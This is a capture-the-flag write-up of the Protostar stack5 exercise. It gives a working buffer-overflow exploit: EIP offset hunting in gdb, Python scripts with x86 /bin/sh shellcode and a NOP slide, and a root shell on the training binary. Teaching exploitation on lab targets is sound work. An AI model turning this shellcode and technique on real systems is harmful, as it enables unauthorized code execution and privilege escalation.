---
title: Protostar Writeup - stack5
updated: 2018-08-07 15:30
---

## Protostar - stack5

This is one of my favorite challenges. We actually get to do something useful here. Our task is to execute shellcode.
Shellcode is nothing but a sequence of bytes, which when executed does some task. Note that this only works if the stack is executable.
This is true for older machines, however newer ones mitigate this vulnerability my making the stack non executable. We don't have to worry much about that.
So here's the code.

```c
```

Nothing useful overhere, except the fact that we have an exploitable `gets()` function. So our choice of attack is a buffer overflow. We know from the previous post, that we can overflow into the EIP. Thus controlling the codeflow.
Once we can do that, it's just a matter of redirecting control to our 'injected' shell code. First things first. Let's get the offset of the EIP. I'm using pwntools to generate the offset string.

```shell
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   ebp
0x080483c5 <main+1>:	mov    ebp,esp
0x080483c7 <main+3>:	and    esp,0xfffffff0
0x080483ca <main+6>:	sub    esp,0x50
0x080483cd <main+9>:	lea    eax,[esp+0x10]
0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave
0x080483da <main+22>:	ret
End of assembler dump.
(gdb) break *0x080483d9
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
(gdb) r
Starting program: /opt/protostar/bin/stack5
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab

Breakpoint 1, main (argc=1633771893, argv=0x61616176) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
```

Finding `0x61616174` in the offset string we find the location of the EIP at 76 bytes. So our address to our shellcode goes after 76 bytes of padding.
Before we proceed let's take a look at the stack and figure out where to place our shell code.

```shell
$ python -c "print 'A' * 76 + 'ABCD'" > /tmp/exploit
$ gdb stack5
(gdb) break *0x080483d9
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
(gdb) r < /tmp/exploit
Starting program: /opt/protostar/bin/stack5 < /tmp/exploit

Breakpoint 1, main (argc=0, argv=0xbffff854) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
(gdb) x/24wx $esp
0xbffff7b0:	0x00000000	0xbffff854	0xbffff85c	0xb7fe1848
0xbffff7c0:	0xbffff810	0xffffffff	0xb7ffeff4	0x08048232
0xbffff7d0:	0x00000001	0xbffff810	0xb7ff0626	0xb7fffab0
0xbffff7e0:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
0xbffff7f0:	0xbffff828	0x87ea710a	0xadbd671a	0x00000000
0xbffff800:	0x00000000	0x00000000	0x00000001	0x08048310
```
We can probably choose anyone of these addresses, let's try the first one `0x0xbffff7b0`.
Below is the exploit script code.

```python
import struct

offset = 'A' * 76
address = struct.pack("I", 0xbffff7b0)
shellcode = 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'

def go():
    print offset + address + shellcode

go()
```

Now let's run this and see what happens.

```shell
$ python /tmp/exploit.py | ./stack5
```

Oh oh!. Something's not right, we're getting an illegal instruction error. Let's take a look at it in the debugger.
We find something even more funny here, it works perfectly fine in the debugger.

```shell
$ python /tmp/exploit.py > /tmp/exploit
$ gdb stack5
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   ebp
0x080483c5 <main+1>:	mov    ebp,esp
0x080483c7 <main+3>:	and    esp,0xfffffff0
0x080483ca <main+6>:	sub    esp,0x50
0x080483cd <main+9>:	lea    eax,[esp+0x10]
0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave
0x080483da <main+22>:	ret
End of assembler dump.
(gdb) break *0x080483d9
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
(gdb) r < /tmp/exploit
Starting program: /opt/protostar/bin/stack5 < /tmp/exploit

Breakpoint 1, main (argc=795371626, argv=0x68732f2f) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb) c
Continuing.
Executing new program: /bin/dash

Program exited normally.
```

This actually bugged me for quite some time. I found a solution to this in the reddit thread [here](https://www.reddit.com/r/LiveOverflow/comments/8pr5ox/problem_on_protostar_stack5/).
What happens is that when you execute a program, the OS even pushes the environment variables onto the stack.
Now when we run the executable outside gdb, the environment is different, and hence the shellcode gets misaligned.
To counter this we can use something called as a NOP slide. NOP is short for no instruction, which will basically do nothing.
The idea is that you set your EIP to an arbitrary address which you hope will land on the NOP slide.
We place our shellcode after the NOP slide, so when the NOPs are done executing, our shellcode is executed.
There is a little trick to choosing this arbitrary address and length of NOP slides, they should be a multiple of 4, else your shellcode will be misaligned.
This is what is happening to us outside gdb, our shellcode is getting misaligned, so let's fix it.
The below exploit is with a little trial and error, but you should get the idea.

```python
import struct

offset = 'A' * 76
address = struct.pack("I", 0xbffff7b0 + 16)
nopslide = '\x90' * 32
shellcode = 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'

def go():
	print offset + address + nopslide + shellcode

go()
```

Let's run it:

```shell
$ python /tmp/exploit.py | ./stack5
$
```

Ok, so no error this time. This begs the question, how do we use the shell, since it exits as soon as it is created.
The reason is that as the input stream closes the shell also exits. So we need a way to hold the input stream.
After digging around a little I came across this stackoverflow [post](https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection).

So using one of those techniques...

```shell
$ (python /tmp/exploit.py; cat) | ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```

Owned! We finally managed to get a shell with root privilages. I hope this gives you a taste of privilage escalation. This was by far the most fun exercise I've done. Hope you enjoyed this too :)

### Sites

[Protostar](https://exploit-exercises.com/protostar/)
[Phrack](http://phrack.org/issues/49/14.html)
